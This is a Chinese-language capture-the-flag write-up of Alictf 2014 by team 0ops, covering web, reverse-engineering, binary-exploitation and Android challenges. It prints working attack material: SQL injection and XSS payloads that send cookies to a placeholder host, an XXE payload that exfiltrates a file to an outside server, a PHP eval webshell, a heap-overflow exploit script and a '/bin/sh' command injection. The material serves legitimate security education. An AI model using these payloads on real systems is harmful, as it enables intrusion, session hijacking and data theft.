# Alictf2014 Writeup

2014/10/08 15:24 | [Sasiki](http://drops.wooyun.org/author/Sasiki "由 Sasiki 发布") | [技术分享](http://drops.wooyun.org/category/tips "查看 技术分享 中的全部文章") | 占个座先 | 捐赠作者

Team Name: 0ops

ctf 所有文件打包下载：[Alictf.zip](http://static.wooyun.org/drops/20141005/Alictf.zip)

## Part 1 BigData

* * *

### 100pt

因为是 webshell,一般是 post 请求,但是经过检查所有 post 并无异常。这样,在 get 请求的情况下,可能会有关键字。 尝试 eval,shell,hack,attack, evil,login,pass 等关键字,发现可疑文件:

```
config1.php?act=attack 
```

统计 id 可得答案。

### 200pt

连上服务器看到这是一个模拟两方通信的游戏,而玩家可以作为中间人篡改通信的消息。消息是由一串在 Start 与 End 之间由逗号分隔的数字组成的,根据数字的大小直接猜测其为十进制的 ASCII 码,解码后看到 alice 与 bob 互相交换了自己的 RSA 公钥,而后的通信就是用 RSA 算法“加密”过了。

这里与其说是“加密”还不如说是“编码”,因为之前交换的公钥的模数 N 实在太短,非常容易就可以分解,强度这么弱的 RSA 就跟编码差不太多了。然后解出之后的通信数据,发现 bob 发送了一个 bob@bob.com,根据题目要求需要替换成 mallory@mallory.com,而后 alice 与 bob 会再度交换公钥,重复上述过程。

这里我因为想偷懒没有用分解 N 而后求 d 的方法,而是直接把双方在消息里发送的公钥的指数 e 从 65537 换成 1,这样双方发送的消息就是明文了,而作为中 间人只是需要把修改后的消息用另一方真正的公钥再加密一次再发送即可,重复这样的过程许多次之后服务器就会把 flag 发送出来。

## Part 2 Web-A

* * *

### 100pt

根据提示是一个手工注入,常规的一些注入 payload 发觉都失效,所以一开始是感觉做了过滤。后来根据论文 http://www.exploit-db.com/papers/18263/ 的提示(False Injection),尝试了

```
Username: '-0||' / Password: 1 
```

发觉还是失败。于是猜测可能并不是做了过滤,而是做了硬编码,不能出现-,只能用|。 最终的 payload 为:

```
￼Username: '|0||' / Password: 1 
```

即可拿到 flag 并提示 web100b 入口地址。

### 200pt

提交参数输出到 onerror 事件中,用 js 做了过滤,不能出现关键字,不能有“+”。 基础 payload 为

```
￼window['location']="http://xxx/"+document['cookie'] 
```

想到用字符拼接绕过关键字过滤,用

```
￼'coo''CONCAT'.toLowerCase() 
```

这种方式绕过“+”,最终 payload 为

```
"><window'loca'['CONCAT'.toLowerCase()]='http://xxx/''CONCAT'.toLowerCase()]('kie')]);> 
```

url 编码后提交得到 flag。

### 300pt

根据题面猜测是 XML 实体注入。先找了一些中文网站的 payload 试了一下,发觉都不行,感觉主要原因是因为没有回显(结合题面的吐槽进一步确定 了)。于是开始 Google。发现了这篇 paper: [`media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-wp.pdf`](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-wp.pdf)。

pdf 里讲得很详细,有 exploit 可用。 网页上填写内容为: ￼￼￼

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://ourserver_ip/xdb.xml">
    %remote;
    %param1; 
]>
<root>&external;</root> 
```

￼xdb.xml 的内容为:

```
<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=bb.php"> 
<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://ourserver_ip/log.php?msg=%payload;'>"> 
```

要注意的地方是,这里不能直接用 file 协议取 bb.php 的内容,因为绝对路径不确定感觉。所以采用 php://filter 以及 base64-encode 的 trick。最后读到的 msg 再 base64_decode 一下就出来 flag 了。

### 400pt

web400a 就是抓包会看到一个文件上传的表单,上传文件后会给出上传后的路径和文件名,发现文件名与当前时间相关。 如/upload/upload/20140920170801.php。但是访问的时候会发现被删了。因此需要不断发生请求在被删之前访问到上传上去的脚本。脚本内容为在上一 级目录生成一句话。

```
<?php file_put_contents('../salt.php', '<?php eval($_POST["c"]); ?>'); ?> 
```

然后在上级目录找到上传后的一句话,就可以菜刀连接了。 菜刀连上去之后发觉/home/wwwroot/default/upload 目录下面有一个 dfghjdjlkfghd.zip。但是有密码,所以一时之间束手无测。随后根据提示,要去 Github 上进行查找。然后再根据之前 curl 连接的时候发觉返回结果有一个注释,大概是这个样子:

```
<!--
    @author: nidongde
--> 
```

自然地,就去找 nidongde 的 github 主页,随后发现 https://github.com/nidongde/test 页面有解压缩密码: test_nidongde,解压之后得到一个 php 文件。提供了它的网址,以及一段内容,通过认证之后服务器会返回 flag。条件:

```
if($key == '_POST' && ~$value['alibaba']['security'] == -2347230984235 && strlen($value['alibaba']['security']) >= 0){ 
```

由于对 GET、GLOBAL 等做了过滤,所以就用 POST 方式传数据。一开始卡住了,因为发现弄不出足够大的整数取反之后符合要求,但是再根据提示要用 x64 的思维。x64 下面自然 int 类型是很大的。最后的 payload 如下:

```
curl -d '_POST[alibaba][security]=2347230984234' -i 'http://web400b.alictf.com/alibaba_CTF_security/' 
```

即可得到 flag。

### 500pt

页面最顶端 js 解密后为

```
location.href.indexOf("helloalibaba")==-1&&(location.href="http://www.alictf.com/"); 
```

即需要在 url 里有"helloalibaba",可以人为构造 a= helloalibaba 来绕过

经过测试,本题有两层过滤。

Php 过滤单引号、双引号和“-”,防止逃逸出 script 标签。

Js 主要过滤`<`,并把所有字母变大写。

因为参数直接输出在`<script>`内,绕过 php 的过滤可用 js 的字符编码,变成\xff 形式。

对 js 过滤,可以用`<<script></script>`绕过。因为会把所有字母变大写,所以`<script>`标签里 js 代码中不能出现字母。在这里通过调用远程 js 代码来避免写这种 js。

因此最终 payload 为

```
<<script src=//xxx/1.js></script> 
```

￼￼￼￼￼￼￼￼ ￼在 linux 服务器上创建 1.JS 文件,内容为

```
p://xxx/xss.php?x='+document.cookie; 
```

提交得到 flag。

## Part 3 Reverse

* * *

### 100pt

题目提示说会把信息加密存储到"secret.db"文件中,并且我们的目标是加密的 key。那么很自然地,把 ch1.exe 拖进 IDA 之后,根据写内容到"secret.db"文 件来定位代码片段。IDA 搜索 text "secret.db"定位到函数 sub_423400,看到了 fopen,基本八九不离十了。

于是退到外面,看调用 sub_423400 之前,发觉调用了函数 sub_4230f0,然后一进去,发现一连串非常可疑的赋值(从 v19 开始的),本着试一试的态 度,在 0042325D 下了一个断点(因为到这里一连串赋值结束了),然后用 Ollydbg 跑一下,从内存里直接把这连续的一段可见字符弄出来就好了,即是 flag。(根据一些常量字符串以及对数据的操作,加密方式应该是 AES)。

### 200pt

根据题目的描述,是程序对输入的一段内容做了加密之后放到了 flag.crypt 文件。先要找到输入的途径,通过 strings 以及对程序稍稍调试,可以发现存放明 文的输入文件为 flag.txt。

我们随便给 flag.txt 输入连续的 123412341234,发觉出来的 flag.crypt 文件的 hex 内容为:

```
A1 A2 A0 A3 9F A4 9E A5 A1 A2 A0 A3 9F A4 9E A5 A1 A2 A0 A3 9F A4 9E A5 
```

正好有循环段,猜测加密过程是 1-1 对应的替换,1 个 bytes 变到 2 个 bytes。接下来做一个简单的程序,把可见字符全部放到一个文件中,然后运行 ch2.exe。这样可以得到可见字符 1-1 对应的码表。接下来根据题目提供的 flag.crypt 文件的 hex 内容倒查这张表,即可获得明文(flag)。

### 300pt

程序下载下来先运行,发现点 Find The Key 之后就会崩溃。用 IDA 看,发现是加了 UPX 的壳,用 UPX 原版工具就可以直接脱壳。但是脱壳后程序就没法直接运行了,丢进 IDA 看到 1400018C0 这个函数会先加载一个 DecryptDll.dll,然后执行其中的 RSADecrypt 函数,但是程序同目录下并没有这个 dll 所以直接运行会报错。

但是程序脱壳之前运行的话至少还会弹出来一个界面,脱了壳之后连界面都没了,这里面肯定还是有些问题。于是去看了下脱壳后的程序的资源区,发现里面就有一个 dll,提取出来后重命名为 DecryptDll.dll,再次运行程序,依然报错。

用 windbg 调试,发现程序还是在调用 RSADecrypt 的时候出了错,仔细检查这个函数调用,发现有四个参数,第一个是密文,第二个是密文长度,第三个是 0,第四个是 64,而程序崩溃是由于一个空指针引用,所以猜测第三个参数可能是解密后输出明文的 buffer,第四个是明文 buffer 的长度。于是把第三个参数从 0 改成一个可写地址,再次执行这个函数,然后查看那个可写地址就会发现 flag

## Part 4 Web-B

* * *

### 100pt

此题会检查 referer 和 cookie。用 web100a 登陆后,发现 cookie 中有

```
username=xbb; isadmin=0; sign=ZGYwMGVhNTZjNGQyZTcwOWRiYWNmMGVkZGYwMGVhNTY0NjliOWUzMA%3D%3D 
```

修改或者删除 cookie 中任意一项就会报错。显然 sign 对参数做了验证。

Sign base64 解密后为一段 40 位的 hash:df00ea56c4d2e709dbacf0eddf00ea56469b9e30 观察得 hash 中有重复部分。去掉头上重复部分剩 32 位,cmd5 上反查为 xbb0。 正好是 cookie 中 username 和 isadmin 的拼接。

利用这个性质伪造 cookie,

```
username=admin; isadmin=1; sign=ZGY2NzhjNjFlMDBjZjI1YWQ0MjY4M2IzZGY2NzhjNjFmNDJjNmJkYQ== 
```

提交得到 flag。

### 200pt

此题限定了开始部分,利用基础认证的形式,构造

```
http://www.taobao.com:dsd@web200b.alictf.com/5.php 
```

得到 flag。

### 300pt

页面打开后发现会载入 whitehat.jpg,下载改后缀为 rar,猜密码为 www.alictf.com,得到提示*.php?img=exp。

又根据题目说在找不到的地方,查看 robots.txt,得到两个隐藏页面。

upload.php 可以用来上传文件,不过强制随机重名命名为 jpg 文件,内容并不检测。 flag.php 为限制文件,只有 admin 能看到。

利用.php?img=exp 可以构造出 xss 来,不过会被 chrome 自身的 xss auditor 拦截。 查看 crossdomain.xml 文件,发现`<allow-access-from domain=""/>` 这样本题就很明确为构造 swf 的 xss。

参考 http://www.freebuf.com/articles/web/37432.html 构造恶意 swf 文件,通过上传点上传。

本题 php 会检查提交的参数里有没有”/”,若存在则会忽略输入,可以用 html 编码为/绕过。

另外在接收 flag.php 内容的站点需要配置 crossdomain.xml 文件,内容同 web300b 的 crossdomain.xml 文件。 最终 payload 为

```
￼"><embed src="http:&#47;&#47;web300b.alictf.com&#47;upload&#47;A57yr8SGGfZKFSPHKrAGk0DYMETL6Aok_jpg.jpg" 
```

提交后记录 flag 用的脚本发现内容没有 flag,注意到管理请求的 referer 为 http://127.0.0.1 开头,修改 Swf 读取的 url 指向 http://127.0.0.1/flag.php,再次提交 得到 flag。

## Part 5 CodeSafe

### 100pt

大概浏览了一下是一个 Linux 提供 RPC 的程序,一共有 3 个 functoin 可以让你调用。漏洞发生在 rpc_function_1,其中注意到: ￼

```
mtl = temp.mtt * tl + 1; mt = (char*)malloc(mtl); 
if(mt)
{
    strcpy(mt,temp.t);
    for(i = 1;i < temp.mtt;i++)
￼￼￼￼￼￼} 
```

由于 temp.mtt 以及 tl 均为 unsigned short 类型并且均可控,所以构造数据可以使得两者乘法导致整形溢出,mtl 会变得较小,于是申请的堆块区域会不足以 放得下传进来的数据,导致堆溢出。完整的 exploit 如下:

```
import struct
import time
import socket
import telnetlib
import random
import sys

def p(x):
    return struct.pack('<I', x)

def netp(x):
    return struct.pack('>I', x)

def shortp(x):
    return struct.pack('<H', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'): 
    d = ''
    while not d.endswith(delim): 
        n = f.read(1)
        if len(n) == 0: 
            print 'EOF'
            break 
        d += n
    return d[:-len(delim)]

host = 'codesafe100.alictf.com' 
port = 30000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

token = '此处 user_token' 

temp = shortp(198)
temp += 'A' * 512

payload = chr(len(token)) # len_token 
payload += token # token
payload += chr(1) # function_id 
payload += netp(len(temp)) # len_data 
payload += temp

f.write(payload)

t = telnetlib.Telnet() 
t.sock = s 
t.interact()

```

￼￼ ￼￼￼￼###200pt

在 rpc_function_2 里,看到最后有一句:

```
sprintf(buffer,"%s has been parsed, tag:%s, value:%s.", line, pr.t, pr.v); 
```

这里隐约就有一些不好的味道了,再翻 到函数的开头仔细检查下 buffer 的长度,是 512 字节,而后面的参数里的 line 就是 request->data,长度<=512。所以这里的 sprintf 是可以造成 buffer 溢出 的,剩下的只是要让程序的逻辑能够走到这一句语句即可。

根据前面的代码分析,提交的 line 需要满足形如”a = b”这样的格式,并且 b 需要使得 function0 返回一个非 0 值。再根据阅读 function0 的代码,能够知道 b 需 要是一个长度为 16 的仅由数字组成的字符串,经过后面的一系列运算后需要使得 s % 10 == 0 这个判断为真,而 b 只要为 16 个 0 就可以满足条件,所以最终 提交的 line 为

```
￼line = 'huihui=' + ('0'*16).rjust(512-7-1, ' ') + '\n' 
```

即可触发漏洞。

### 300pt

上来先大概看了一遍,没看到什么特别的明显的问题,再仔细从 rpc_function_0 开始看,看到 rpc_function_2 的后半部分的时候又看到一个 sprintf:

```
￼sprintf(r,"/temporary folder/2014-08/%s",p); 
```

其中`r = (char*)malloc(256);`

而 p 是 function6 的一个输出,function6 的功能是从 url 中提取 host,port 和 path 信息,p 就是 url 中的路径,url 的长度限制也为 256,且需要以 ￼http://alibaba.com/开头所以 p 长度最多为 236,但是加上"/temporary folder/2014-08/"之后就可以往 r 里输出 262 个字节,导致堆溢出。

再从头看一遍 rpc_function_2 的代码,要触发漏洞需要过程序前面的一些条件判断,比如

```
nm = 0x4848
ts = time.time() + 999 
```

而 k 需要过一个 function4 之后与”alibaba-inc”相等,看一下代码就发现 function4 是凯撒密码,偏移是 010 也就是八进制的 10 也就是十进制的 8,所以做一下反向偏移的凯撒加密就得到

```
k = 'sdatsts-afu'.ljust(16, '\x00')
v=2
url_len = 255
url = 'http://alibaba.com/'.ljust(255, 'p') + '\x00' 
```

即可。

这里还可能会有的问题的地方就是 time_t 了,在 32 位下是 unsigned int,大小是 4 字节;而在 64 位下是 unsigned long long,大小是 8 字节。本地测试的时候 还发现,如果是 64 位的话这个 struct stc 的内部结构可能还会有一些对齐方面的问题。经过测试服务器上的程序是 32 位的,不会有 64 位上的对齐问题。

### 400pt

这个程序非常诡异的在 rpc_function_1 里有调用 system 函数:

```
char cbuffer[512];
snprintf(cbuffer, 512,"ping %s",temp.buffer); 
system(cbuffer); 
```

这里 temp.buffer 的长度限制为 256,而 cbuffer 为 512,所以不会有溢出。但是后面这个 system 真是让人醉了,看起来好像是在执行 ping,但是参数是用字 符串拼接起来的,只要里面有分号就可以造成命令注入,比如拼接上如下字符串 `'; /bin/sh<&9 >&9 2>&9'` 就可以在远端起一个 shell。剩下的还是要过程序前面的逻辑的问题,粗看了下似乎需要用户名为 admin 才有执行命令的权限,而做口令判断的这个地方用到了 function3,而 function3 实际上是弗吉尼亚 密码,用 admin 登录时候的 key 就是”admin”,经过加密变换之后需要与”ALIBABA”相等,于是就可以构造好用户名和口令了,但是本地测试的时候却莫名 其妙地提示 No privilege.感觉非常奇怪,于是就上 gdb 在校验密码的地方下了个断点,发现 login 变量先被赋值成 1,而后又被赋值成 0,非常诡异,而后再 去看代码,看到

```
if(strcmp(value,"ALIBABA") == 0) 
    login = 1;
else
    printf("%s login failed!",szUser); 
    login = 0; 
```

这个真是醉了,else 后面居然没加大括号!这个跟苹果之前被爆出的 goto fail bug 有异曲同工之处。这就导致了 login = 0;这句赋值始终会被执行, 同时也就意味着 admin 永远无法登陆成功,难道这个 system 就是故意放着逗你玩的吗?再从头仔细看一遍代码,发现提交数据中的 temp.user 和 temp.pass 长度都是 128,而用来做判断的 szUser 和 szPass 只取了前面 63 个字节,并且只是对 temp.user 用 function1 去掉了尾部的空格,并没有处理 szUser 和 szPass,只是 在作为 guest 登录成功之后才会用 function1 处理一下 szUser,而后的权限检查是判断这个处理过后的 szUser 是否等于"admin",所以可以构造这样一个

```
user = 'admin'.ljust(64, ' ') + 'p' 
```

以 guest 的逻辑登录并且绕过 admin 的权限检查,最终的提交数据为

```
user = 'admin'.ljust(64, ' ') + 'p' 
hashval = 'alibaba'
password = ''
for i in xrange(len(hashval)):
    c = chr((ord(hashval[i]) - ord('guest'[i%5])) % 26 + ord('a'))
    password += c
cmd = '; /bin/sh<&9 >&9 2>&9'
data = user.ljust(128, '\x00') + password.ljust(128, '\x00') + cmd.ljust(256, '\x00') 
```

本地测试的时候可以成功开出 shell,不过远程的服务器就只是返回了一个 flag 而已>_<

## Part 6 EvilApk

* * *

### 100pt

反编译,在源码中就能看到文件的名称

### 200pt

反编译,通过搜索 method 的功能搜索 sendSMS,得到次数。

### 300pt

根据题目描述,这里是考察 android 的 webview 漏洞。程序加了特殊的壳,不容易直接分析,但是如果要利用这个漏洞要知道在 addJavascriptInterface 里 触发漏洞时需要调用的对象是什么。 ￼￼￼￼￼￼￼￼￼ ￼这里用到了 LoCCS 实验室的安卓 API 监控工具,链接在 https://github.com/romangol/InDroid。直接把 apk 扔进去跑,并一路记录 apk 调用的 API。结果可以 发现进入 addJavascriptInterface 之后显示的对象名字叫做 SmokeyBear。题目说要弹出一个 Toast 来获取 flag。于是我们构造一个 js 文件,其中

```
function execute() { SmokeyBear.showToast(); } 
```

尝试调用 showToast 方法来获得 Toast 里的内容,即 flag。

### 400pt

这个 apk 程序同样也是加了特殊的壳,不能直接进行反汇编然后分析。于是再次使用 LoCCS 实验室的安卓 API 监控工具跑一下。可以看到在流程中,apk 调 用了一些 Java 相关的加密函数,其中收集到的信息包括(Indroid 可以进行 API 调用以及其具体参数是什么的收集):

```
算法:DESede
key:1f 98 ce ab 20 97 70 ef a8 75 c2 45 85 3e ce 76 1f 98 ce ab 20 97 70 ef 
IV: 00 0a 0a 0a 0a 02 02 aa
分组模式:CBC
Padding 模式:PKC5 
```

加密之后,同 000a0a0a0a0202aa5458d715704493d8e6b9bd38f8b6be0e 进行比较。去掉前面的 IV,后面就是密文。 由于整个信息非常齐全,所以可以写一个解密程序最后结果是(hex):

```
697A5E5A4A940E59C9FE4BEB8 
```

将其转成中文编码可得到 flag。

### 500pt

题目里给了一个 so,丢进 IDA 看到一大堆函数,用 readelf 发现有 JNI_OnLoad 这个函数,丢进 IDA 看,发现很多函数里都有 switch 的结构,估计是都做了控 制流混淆了,查看程序中的字符串也只看到一大堆的奇怪字符串,猜测是加过密了。尝试写一个 APK 去调用这个 so 进行动态调试,但是一直都没有成功, 所以刚开始的时候毫无头绪。 后来看到题目里给了提示是/proc/%pid%/下的某个文件,然后就决定既然动态分析一直不成功的话不如尝试一下静态分析,虽然代码有混淆但还不算是 特别严重,特别观察文件打开相关库函数(open、fopen)的参数,发现路径名会用 sprintf 来生成,并且再往前看发现有 getpid 的调用,于是就猜测程序是先 生成一个类似/proc/%d/xxxx 这样的字符串,再用 sprintf 把 pid 代入生成最终的路径名,而且字符串解密的函数也就在附近,解密算法也不是非常复杂,但 是不同的字符串用的解密算法是不同的,稍微感觉有些蛋疼。

我们先找到了一个/proc/%d/cmdline,提交了不对,只能继续再寻找,最后找到了一个/proc/%d/stat,对应的解密算法在 51624 附近

```
byte_1011E8[v1] = 0xCF * byte_E68CA[v1] - 0x6A - (0x9E * byte_E68CA[v1] & 0x2C); 
```

对应密文在 E68CA 处

```
0xF7, 0x3A, 0xDC, 0xB7, 0xFB, 0xF7, 0xDD, 0x6E, 0xF7,0xB, 0x7E, 0x59, 0x7E 
```

运气较好,尝试提交后通过。

版权声明：未经授权禁止转载 [Sasiki](http://drops.wooyun.org/author/Sasiki "由 Sasiki 发布")@[乌云知识库](http://drops.wooyun.org)

分享到：

### 相关日志

*   [逆向基础（九）](http://drops.wooyun.org/tips/2459)
*   [深入了解 SQL 注入绕过 waf 和过滤机制](http://drops.wooyun.org/tips/968)
*   [CVE-2014-4113 漏洞利用过程分析](http://drops.wooyun.org/papers/3331)
*   [CVE-2014-6321 schannel 堆溢出漏洞分析](http://drops.wooyun.org/papers/4194)
*   [生物特征识别之指纹识别，伪造，指纹设备缺陷设计](http://drops.wooyun.org/tips/2140)
*   [Wordpress 3.8.2 补丁分析 HMAC timing attack](http://drops.wooyun.org/papers/1404)